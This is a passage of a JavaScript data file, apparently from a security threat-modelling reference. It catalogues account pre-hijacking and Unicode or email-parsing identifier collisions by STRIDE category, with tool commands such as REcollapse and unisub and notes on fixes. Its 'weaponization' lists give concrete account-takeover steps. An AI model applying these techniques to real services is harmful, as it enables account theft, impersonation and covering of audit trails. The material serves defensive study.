          'The measures that do not work, and which you will see proposed in response to these reports, are worth naming: blocking non ASCII identifiers stops the Unicode half but none of the pre-hijacking half; adding MFA at login does not help when the attacker enrolled the MFA factor first as a trojan identifier; rate limiting does nothing because none of this needs volume.',
        ],
        examples: [
          { code: 'pip3 install recollapse   then   recollapse -m 3,6,7 -e 2 victim@target.com', note: 'Encoding 2 emits the \\uXXXX form for JSON bodies, which is the shape most identity APIs take.' },
          { code: 'https://0xacb.com/normalization_table   https://0xacb.com/case_table   https://0xacb.com/truncation_table', note: 'The three lookup tables behind REcollapse modes 3, 6, and 7.' },
          { code: 'go install github.com/tomnomnom/hacks/unisub@latest   then   unisub a', note: 'Lists the characters that fold into a given one, so you can build the variant by hand.' },
          { code: 'docker run -p 8080:8080 ghcr.io/navikt/mock-oauth2-server', note: 'Local OIDC provider for asserting an unverified email claim at the relying party.' },
          { code: 'Regression test to demand:  assert register("jac\\u212a@t.com") conflicts with existing "jack@t.com"', note: 'Turns the fix into something the target can keep, rather than a one line patch on one endpoint.' },
        ],
      },
    ],
    stride: {
      spoofing: {
        weaponization: [
          'Register the victim address before they ever sign up, then let their first federated login merge into the attacker owned row so the password the attacker set still authenticates as the victim (Classic Federated Merge).',
          'Hold a session opened before the victim recovered the account and keep acting as them afterwards, because the password reset rotated the credential but not the session (Unexpired Session).',
          'Plant a secondary email, phone number, linked social identity, API token, or enrolled MFA factor on the pre-created account and recover the victim account through that identifier after they have taken possession (Trojan Identifier).',
          'Start an email change to an attacker mailbox, withhold the confirmation until after the victim owns the account, then complete it so the account identity of record becomes the attacker address (Unexpired Email Change).',
          'Assert the victim address from an identity provider that never verified mailbox ownership so the relying party merges the attacker identity into the victim account (Non Verifying IdP).',
          'Request a password reset with an address that differs from the victim only by a case mapping collision (U+0131 under uppercase, U+212A under lowercase or casefold, U+017F or U+00DF under casefold or uppercase, and U+017F under NFKC as well) so the lookup finds the victim row and the token is mailed to the attacker.',
          'Register an identifier built from compatibility characters (fullwidth, circled, ligature, modifier capital) that a second component NFKC folds down to the victim username or address exactly.',
          'Exploit a canonicaliser that is not idempotent so the value passes the uniqueness check as one string and resolves onto the victim on the second pass, as in the Spotify bigbird case.',
          'Pad an identifier past a fixed width column, or append a four byte character that a three byte MySQL utf8 column truncates at, so the stored value is byte for byte the victim identifier.',
          'Register the victim identifier with leading or trailing whitespace, a null byte, or a soft hyphen that one component trims and the next does not, then reset the real account through it.',
          'Craft an address the application parses as victim@target.com and the mail transfer agent delivers to an attacker mailbox, using a quoted local part, an RFC 5322 comment, a doubled @, an RFC 2047 encoded word, a UUCP bang route, or the Postfix percent hack.',
          'Inject a cc or bcc header, or send duplicate or array valued email parameters, so the identity lookup uses the victim address and the delivery uses the attacker address.',
          'Use Gmail dot, plus tag, and googlemail.com canonicalisation to hold many accounts behind one mailbox, defeating one account per person identity assumptions and colliding with an existing account.',
          'Register a homograph or punycode domain, or abuse an IDNA2003 versus IDNA2008 deviation character, so an address the attacker controls is treated as belonging to a claimed corporate domain.',
          'Once merged, act as the victim toward third parties: their verified address on outbound mail, their name on comments, invoices, support tickets, and audit entries, because the account genuinely carries their identifier.',
        ],
        why: 'The service proves identity by matching a submitted identifier string against a stored one, so anything that makes two different strings resolve to one row, or that plants an attacker credential on the row before the real owner claims it, produces a correct and successful identity check for the wrong person.',
      },
      elevation_of_privilege: {
        weaponization: [
          'Aim the collision at an administrator, staff, or service account identifier so the reset token or the merge lands on a privileged row rather than a peer one.',
          'Normalise an attacker controlled address into a claimed corporate domain and get auto joined to the workspace or tenant, inheriting its default role and its shared content without any invitation.',
          'Defeat an internal only signup allowlist implemented as a suffix or substring check on the email domain, reaching a registration path that was never meant to be public.',
          'Pre-hijack a personal address that is later converted to a corporate or admin account, so the attacker foothold is present when the privileges are granted rather than needing to attack them afterwards.',
          'Keep a trojan MFA enrolment or API token on the account so that hardening applied later (MFA requirement, forced password rotation) is already satisfied by an attacker controlled factor.',
        ],
        why: 'Roles and tenant membership are attached to the identity row and to the domain part of the address, so making the system resolve you onto a privileged row or into a trusted domain hands you its permissions without any authorization check ever being wrong.',
      },
      tampering: {
        weaponization: [
          'Rewrite the victim password using a reset token that a colliding identifier delivered to the attacker mailbox.',
          'Complete a withheld email change so the account identity of record is rewritten to an attacker mailbox after the victim has begun relying on the account.',
          'Change the victim registered phone number, recovery address, or linked identity provider from inside the merged account, closing the owner out of their own recovery paths.',
          'Seed the pre-created account with attacker controlled state (webhooks, API keys, OAuth grants, integrations, billing details, sharing rules) that the victim inherits and then trusts as their own configuration.',
          'Create a duplicate row through a concurrent signup with two colliding variants so the application holds two records it cannot tell apart, and edits applied to one silently diverge from the other.',
        ],
        why: 'The merge gives the attacker authenticated write access to the victim own record, so identity data and account configuration are edited at the source rather than worked around.',
      },
      information_disclosure: {
        weaponization: [
          'Read everything the victim adds to the account after they take possession, because the pre-created session or trojan identifier still resolves to the same row: documents, messages, payment details, uploaded files.',
          'Read the shared content of an organisation after a domain collision produced workspace auto join, which is a tenant wide exposure rather than a single account.',
          'Receive the victim password reset tokens, magic links, and verification codes at an attacker mailbox through an identifier collision or a mail parser split.',
          'Use signup uniqueness responses and reset responses as an existence oracle, since a duplicate error on a variant reveals both that the account exists and which normalisation the backend applies.',
          'Compare responses across variants to fingerprint the stack: which transform folds tells you the language, the collation, and often the framework, before any exploitation is attempted.',
        ],
        why: 'Reading is a direct consequence of resolving to the victim row and the victim delivery stream, so the attacker sees the data and the secrets sent to that identity without ever compromising a credential.',
      },
      repudiation: {
        weaponization: [
          'Operate a second live session on an account the victim is also using, so two principals appear in the history as one and neither can be attributed.',
          'Rely on the application normalising the submitted identifier before it logs it, so the log line reads victim@target.com and the actual bytes sent, with the Kelvin sign or the padding or the comment, are never recorded anywhere.',
          'Have outbound mail, comments, and approvals carry the victim verified address as the sender, giving attacker actions the strongest attribution signal the system has.',
        ],
        why: 'The audit trail records the identity the system resolved to rather than the string that was submitted, so a successful collision erases the only evidence that the actor and the account holder were different people.',
      },
      denial_of_service: {
        weaponization: [
          'Squat the victim address or username before they register so their genuine signup is refused as already taken, blocking them from the service while the takeover is prepared.',
          'Register enough colliding variants of a reserved or high value handle that the namespace is exhausted for the legitimate claimant.',
          'Trigger reset throttles or account lockouts repeatedly from a colliding identifier so the real owner cannot complete the recovery they need.',
          'Occupy a seat or a one account per address slot inside an organisation so the legitimate user cannot be provisioned into the tenant.',
        ],
        why: 'Identifier uniqueness is a scarce resource the application allocates first come first served on unverified input, so occupying the victim identifier denies the real owner the ability to hold their own identity.',
      },
    },
  },
];

// All attacks that are weaponized to achieve a given STRIDE category.
export function attacksForCategory(categoryKey) {
  return attacks.filter((a) => a.stride && a.stride[categoryKey]);
}
